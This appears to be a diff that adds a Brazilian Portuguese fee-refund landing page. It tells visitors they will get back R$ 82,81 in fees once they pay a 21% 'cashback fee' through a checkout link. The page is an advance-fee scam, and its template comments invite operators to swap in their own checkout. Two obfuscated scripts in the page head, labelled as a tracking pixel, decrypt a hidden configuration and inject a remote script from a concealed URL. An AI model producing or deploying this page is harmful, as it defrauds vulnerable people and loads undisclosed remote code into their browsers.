@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Reembolso de Taxas</title>
+
+  <meta
+    name="description"
+    content="Confira as informações e condições apresentadas para o reembolso de taxas."
+  >
+
+  <style>
+
+    :root {
+      --primary: #ee4d2d;
+      --primary-dark: #d83f22;
+      --orange: #ff6b3d;
+
+      --background: #f7f7f7;
+      --white: #ffffff;
+
+      --text: #222222;
+      --secondary: #666666;
+      --muted: #999999;
+
+      --border: #eeeeee;
+
+      --light-orange: #fff3ef;
+
+      --success: #168a45;
+
+      --shadow:
+        0 8px 30px rgba(0, 0, 0, 0.07);
+    }
+
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+
+    html {
+      scroll-behavior: smooth;
+    }
+
+
+    body {
+      font-family:
+        Arial,
+        Helvetica,
+        sans-serif;
+
+      background: var(--background);
+
+      color: var(--text);
+
+      line-height: 1.5;
+    }
+
+
+    /* =========================
+       BARRA SUPERIOR
+    ========================= */
+
+    .top-bar {
+      width: 100%;
+      height: 6px;
+
+      background:
+        linear-gradient(
+          90deg,
+          var(--primary),
+          var(--orange)
+        );
+    }
+
+
+    /* =========================
+       HEADER
+    ========================= */
+
+    header {
+      width: 100%;
+
+      background: var(--white);
+
+      border-bottom:
+        1px solid var(--border);
+
+      padding: 18px 15px;
+    }
+
+
+    .header-container {
+      width: 100%;
+      max-width: 720px;
+
+      margin: 0 auto;
+
+      display: flex;
+
+      justify-content: center;
+      align-items: center;
+    }
+
+
+    /*
+      ===============================
+      ÁREA PARA SUA LOGO
+      ===============================
+
+      Para colocar sua logo:
+
+      1. Remova o texto "SUA LOGO AQUI"
+      2. Coloque:
+
+      <img src="logo.png" alt="Logo">
+
+      dentro da div .logo-area
+    */
+
+
+    .logo-area {
+      width: 180px;
+      height: 62px;
+
+      display: flex;
+
+      align-items: center;
+      justify-content: center;
+
+      border:
+        2px dashed #dddddd;
+
+      border-radius: 10px;
+
+      color: #999999;
+
+      font-size: 13px;
+
+      font-weight: 700;
+
+      background: #ffffff;
+
+      overflow: hidden;
+    }
+
+
+    .logo-area img {
+      max-width: 100%;
+      max-height: 100%;
+
+      object-fit: contain;
+    }
+
+
+    /* =========================
+       CONTAINER PRINCIPAL
+    ========================= */
+
+    main {
+      width: 100%;
+
+      max-width: 720px;
+
+      margin: 25px auto 50px;
+
+      padding: 0 15px;
+    }
+
+
+    /* =========================
+       HERO
+    ========================= */
+
+    .hero {
+      background: var(--white);
+
+      border-radius: 15px;
+
+      padding: 30px 23px;
+
+      box-shadow: var(--shadow);
+
+      text-align: center;
+
+      margin-bottom: 18px;
+    }
+
+
+    .tag {
+      display: inline-block;
+
+      background: var(--light-orange);
+
+      color: var(--primary);
+
+      padding:
+        7px 14px;
+
+      border-radius: 30px;
+
+      font-size: 12px;
+
+      font-weight: 800;
+
+      text-transform: uppercase;
+
+      margin-bottom: 14px;
+    }
+
+
+    .hero h1 {
+      font-size: 28px;
+
+      line-height: 1.2;
+
+      font-weight: 800;
+
+      margin-bottom: 12px;
+    }
+
+
+    .hero p {
+      max-width: 560px;
+
+      margin: 0 auto;
+
+      color: var(--secondary);
+
+      font-size: 15px;
+    }
+
+
+    /* =========================
+       SEÇÕES
+    ========================= */
+
+    .section {
+      background: var(--white);
+
+      border-radius: 15px;
+
+      padding: 24px;
+
+      margin-bottom: 18px;
+
+      box-shadow: var(--shadow);
+    }
+
+
+    .section-title {
+      font-size: 20px;
+
+      font-weight: 800;
+
+      margin-bottom: 18px;
+    }
+
+
+    .section-subtitle {
+      color: var(--secondary);
+
+      font-size: 14px;
+
+      margin-bottom: 18px;
+    }
+
+
+    /* =========================
+       LISTA DE TAXAS
+    ========================= */
+
+    .fee-list {
+      display: flex;
+
+      flex-direction: column;
+
+      gap: 10px;
+    }
+
+
+    .fee {
+      display: flex;
+
+      align-items: center;
+
+      justify-content: space-between;
+
+      gap: 15px;
+
+      padding: 15px;
+
+      background: #ffffff;
+
+      border:
+        1px solid var(--border);
+
+      border-radius: 10px;
+
+      transition:
+        transform 0.2s ease,
+        box-shadow 0.2s ease;
+    }
+
+
+    .fee:hover {
+      transform: translateY(-1px);
+
+      box-shadow:
+        0 5px 15px
+        rgba(0, 0, 0, 0.05);
+    }
+
+
+    .fee-name {
+      color: #444444;
+
+      font-size: 14px;
+
+      font-weight: 500;
+    }
+
+
+    .fee-value {
+      color: #222222;
+
+      font-size: 15px;
+
+      font-weight: 800;
+
+      white-space: nowrap;
+    }
+
+
+    /* =========================
+       PRIMEIRO ITEM - FRETE
+    ========================= */
+
+    .fee:first-child {
+      background:
+        linear-gradient(
+          135deg,
+          #fff4f0,
+          #ffffff
+        );
+
+      border-color:
+        #ffd2c7;
+    }
+
+
+    .fee:first-child .fee-name {
+      color: var(--primary);
+
+      font-weight: 800;
+    }
+
+
+    .fee:first-child .fee-value {
+      color: var(--primary);
+
+      font-size: 16px;
+    }
+
+
+    /* =========================
+       TOTAL
+    ========================= */
+
+    .total {
+      display: flex;
+
+      align-items: center;
+
+      justify-content: space-between;
+
+      margin-top: 16px;
+
+      padding: 18px;
+
+      border-radius: 11px;
+
+      background: #f8f8f8;
+
+      font-size: 17px;
+
+      font-weight: 800;
+    }
+
+
+    .total-value {
+      color: var(--primary);
+
+      font-size: 19px;
+    }
+
+
+    /* =========================
+       BLOCO CASHBACK
+    ========================= */
+
+    .cashback-box {
+      background:
+        linear-gradient(
+          135deg,
+          #fff3ef,
+          #fff9f7
+        );
+
+      border:
+        1px solid #ffd3c9;
+
+      border-radius: 14px;
+
+      padding: 24px;
+
+      text-align: center;
+    }
+
+
+    .cashback-box h2 {
+      font-size: 22px;
+
+      line-height: 1.25;
+
+      margin-bottom: 10px;
+    }
+
+
+    .cashback-box p {
+      color: var(--secondary);
+
+      font-size: 14px;
+
+      line-height: 1.6;
+    }
+
+
+    .percentage {
+      display: inline-block;
+
+      margin-top: 14px;
+
+      background: var(--primary);
+
+      color: #ffffff;
+
+      padding: 7px 14px;
+
+      border-radius: 20px;
+
+      font-size: 13px;
+
+      font-weight: 800;
+    }
+
+
+    .amount {
+      margin: 13px 0;
+
+      color: var(--primary);
+
+      font-size: 34px;
+
+      font-weight: 900;
+    }
+
+
+    /* =========================
+       BOTÃO
+    ========================= */
+
+    .button-wrapper {
+      margin-top: 20px;
+    }
+
+
+    .cta-button {
+      display: block;
+
+      width: 100%;
+
+      padding: 18px 20px;
+
+      border-radius: 11px;
+
+      background:
+        linear-gradient(
+          135deg,
+          var(--primary),
+          var(--orange)
+        );
+
+      color: #ffffff;
+
+      text-decoration: none;
+
+      text-align: center;
+
+      font-size: 18px;
+
+      font-weight: 900;
+
+      box-shadow:
+        0 9px 25px
+        rgba(238, 77, 45, 0.28);
+
+      animation:
+        pulse 1.7s infinite;
+
+      transition:
+        transform 0.2s ease,
+        background 0.2s ease;
+    }
+
+
+    .cta-button:hover {
+      background:
+        linear-gradient(
+          135deg,
+          var(--primary-dark),
+          var(--primary)
+        );
+
+      transform: translateY(-2px);
+    }
+
+
+    .cta-button:active {
+      transform: scale(0.98);
+    }
+
+
+    @keyframes pulse {
+
+      0% {
+        transform: scale(1);
+
+        box-shadow:
+          0 9px 25px
+          rgba(238, 77, 45, 0.25);
+      }
+
+      50% {
+        transform: scale(1.025);
+
+        box-shadow:
+          0 12px 32px
+          rgba(238, 77, 45, 0.42);
+      }
+
+      100% {
+        transform: scale(1);
+
+        box-shadow:
+          0 9px 25px
+          rgba(238, 77, 45, 0.25);
+      }
+    }
+
+
+    /* =========================
+       SEGURANÇA
+    ========================= */
+
+    .security {
+      display: flex;
+
+      align-items: center;
+
+      justify-content: center;
+
+      gap: 7px;
+
+      margin-top: 13px;
+
+      color: #777777;
+
+      font-size: 12px;
+
+      text-align: center;
+    }
+
+
+    /* =========================
+       AVISO
+    ========================= */
+
+    .notice {
+      margin-top: 17px;
+
+      color: #888888;
+
+      font-size: 11px;
+
+      line-height: 1.6;
+
+      text-align: center;
+    }
+
+
+    /* =========================
+       FOOTER
+    ========================= */
+
+    footer {
+      padding:
+        10px 15px 35px;
+
+      text-align: center;
+
+      color: #999999;
+
+      font-size: 11px;
+    }
+
+
+    /* =========================
+       RESPONSIVO
+    ========================= */
+
+    @media (max-width: 600px) {
+
+      header {
+        padding: 15px;
+      }
+
+
+      .logo-area {
+        width: 155px;
+
+        height: 55px;
+      }
+
+
+      main {
+        margin-top: 15px;
+
+        padding:
+          0 10px;
+      }
+
+
+      .hero {
+        padding:
+          25px 17px;
+      }
+
+
+      .hero h1 {
+        font-size: 24px;
+      }
+
+
+      .hero p {
+        font-size: 14px;
+      }
+
+
+      .section {
+        padding: 18px;
+      }
+
+
+      .section-title {
+        font-size: 18px;
+      }
+
+
+      .fee {
+        padding: 13px;
+      }
+
+
+      .fee-name {
+        font-size: 13px;
+      }
+
+
+      .fee-value {
+        font-size: 14px;
+      }
+
+
+      .total {
+        padding: 16px;
+
+        font-size: 15px;
+      }
+
+
+      .total-value {
+        font-size: 17px;
+      }
+
+
+      .cashback-box {
+        padding: 20px 16px;
+      }
+
+
+      .cashback-box h2 {
+        font-size: 20px;
+      }
+
+
+      .amount {
+        font-size: 30px;
+      }
+
+
+      .cta-button {
+        font-size: 16px;
+
+        padding:
+          17px 12px;
+      }
+    }
+
+  </style>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+
+
+<body>
+
+
+  <!-- =========================
+       TOPO
+  ========================= -->
+
+  <div class="top-bar"></div>
+
+
+  <header>
+
+    <div class="header-container">
+
+      <!--
+        ============================================
+        COLOQUE SUA LOGO AQUI
+        ============================================
+
+        Exemplo:
+
+        <div class="logo-area">
+          <img src="logo.png" alt="Sua Logo">
+        </div>
+
+      -->
+
+      <div class="logo-area">
+        <img src="logo.png" alt="logo.png">
+      </div>
+
+    </div>
+
+  </header>
+
+
+
+  <main>
+
+
+    <!-- =========================
+         APRESENTAÇÃO
+    ========================= -->
+
+    <section class="hero">
+
+      <span class="tag">
+ Parabéns! Todos os processos foram concluídos com sucesso.
+Seu cartão e sua conta já estão liberados. Em breve, você receberá no WhatsApp cadastrado o link do aplicativo e o código de rastreio do seu cartão físico. 
+ 
+      </span>
+
+
+      <h1>
+        Receba os valores das taxas de volta
+      </h1>
+
+
+      <p>
+        Conforme previsto em contrato, após a regularização de todas as etapas, você tem direito ao recebimento dos valores referentes às taxas pagas.
+
+      </p>
+
+    </section>
+
+
+
+    <!-- =========================
+         TAXAS
+    ========================= -->
+
+    <section class="section">
+
+      <div class="section-title">
+        Veja abaixo os valores pagos em taxa:
+      </div>
+
+
+      <div class="section-subtitle">
+        Os valores estão organizados abaixo para facilitar
+        a conferência.
+      </div>
+
+
+      <div class="fee-list">
+
+
+        <!--
+          PRIMEIRO ITEM:
+          TAXA DE FRETE
+        -->
+
+        <div class="fee">
+
+          <span class="fee-name">
+            Taxa de Frete
+          </span>
+
+          <span class="fee-value">
+            R$ 11,90 / R$ 17,90
+          </span>
+
+        </div>
+
+
+
+        <div class="fee">
+
+          <span class="fee-name">
+            Taxa de Ativação
+          </span>
+
+          <span class="fee-value">
+            R$ 19,11
+          </span>
+
+        </div>
+
+
+
+        <div class="fee">
+
+          <span class="fee-name">
+            Taxa de IOF
+          </span>
+
+          <span class="fee-value">
+            R$ 27,90
+          </span>
+
+        </div>
+
+
+
+        <div class="fee">
+
+          <span class="fee-name">
+            Seguro prestamista
+          </span>
+
+          <span class="fee-value">
+            R$ 17,90
+          </span>
+
+        </div>
+
+
+      </div>
+
+
+
+      <!-- TOTAL -->
+
+      <div class="total">
+
+        <span>
+          Total de taxas
+        </span>
+
+        <span class="total-value">
+          R$ 82,81
+        </span>
+
+      </div>
+
+    </section>
+
+
+
+    <!-- =========================
+         TARIFA / OFERTA
+    ========================= -->
+
+    <section class="section">
+
+      <div class="cashback-box">
+
+
+        <h2>
+          Tarifa de CASHBACK
+        </h2>
+
+
+        <p>
+         Para receber o reembolso das taxas, é necessário pagar a tarifa CASHBACK, equivalente a 21% das taxas. O valor também será reembolsado.
+
+
+        </p>
+
+
+        <span class="percentage">
+          21% DO TOTAL INFORMADO
+        </span>
+
+
+        <div class="amount">
+          R$ 16,61
+        </div>
+
+
+        <p>
+          Confira cuidadosamente todas as informações e
+          condições antes de realizar qualquer pagamento.
+        </p>
+
+
+      </div>
+
+
+
+      <!-- =========================
+           BOTÃO
+           
+           TROQUE O LINK ABAIXO
+           PELO SEU CHECKOUT
+      ========================= -->
+
+      <div class="button-wrapper">
+
+        <a
+          class="cta-button"
+          href="https://pagamentosimples.com.br/LFKGkiWx"
+        >
+          PAGAR (VALOR REEMBOLSAVEL)
+        </a>
+
+      </div>
+
+
+      <div class="security">
+
+        <span>
+          🔒
+        </span>
+
+        <span>
+          Você será direcionado para o checkout informado
+        </span>
+
+      </div>
+
+
+      <p class="notice">
+
+        Antes de realizar qualquer pagamento, confira
+        os valores, condições e informações apresentados.
+        Esta página é independente e não representa
+        oficialmente banco, instituição financeira ou
+        marketplace de terceiros.
+
+      </p>
+
+    </section>
+
+
+  </main>
+
+
+
+  <!-- =========================
+       RODAPÉ
+  ========================= -->
+
+  <footer>
+
+    © 2026 — Todos os direitos reservados.
+
+  </footer>
+
+
+</body>
+</html>
+
+
+
